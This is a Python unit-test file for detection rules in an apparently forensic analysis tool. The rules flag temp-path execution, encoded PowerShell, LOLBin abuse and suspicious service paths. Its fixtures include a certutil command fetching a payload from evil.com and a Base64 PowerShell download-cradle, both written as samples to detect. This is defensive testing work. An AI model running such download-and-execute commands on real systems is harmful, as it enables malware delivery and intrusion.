import pytest
from pathlib import Path

from analysis.rules.execution_rules import SuspiciousPathExecutionRule, LOLBinExecutionRule
from analysis.rules.command_rules import EncodedPowerShellRule
from analysis.rules.persistence_rules import NonStandardServicePathRule
from config.settings import Severity


@pytest.mark.unit
def test_suspicious_path_rule_matches():
    rule = SuspiciousPathExecutionRule()
    record = {"executable": "payload.exe", "path": "C:\\Users\\victim\\AppData\\Local\\Temp\\payload.exe", "evidence_id": "pf_1"}
    finding = rule.evaluate(Path("prefetch.json"), record)

    assert finding is not None
    assert finding.severity == Severity.HIGH
    assert "payload.exe" in finding.title
    assert "Execution from Volatile / Temporary Path" in finding.rule_name


@pytest.mark.unit
def test_encoded_powershell_rule_matches():
    rule = EncodedPowerShellRule()
    record = {"command": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA="}
    finding = rule.evaluate(Path("powershell.json"), record)

    assert finding is not None
    assert "Base64 Encoded PowerShell" in finding.title
    assert finding.severity == Severity.HIGH


@pytest.mark.unit
def test_lolbin_execution_rule():
    rule = LOLBinExecutionRule()
    record = {"command_line": "certutil.exe -urlcache -split -f http://evil.com/payload.exe"}
    finding = rule.evaluate(Path("cmd.json"), record)

    assert finding is not None
    assert "certutil.exe" in finding.title


@pytest.mark.unit
def test_non_standard_service_rule():
    rule = NonStandardServicePathRule()
    record = {"service_name": "BackdoorSvc", "binary_path": "C:\\Users\\Public\\malware.exe"}
    finding = rule.evaluate(Path("services.json"), record)

    assert finding is not None
    assert finding.severity == Severity.CRITICAL
    assert "BackdoorSvc" in finding.title
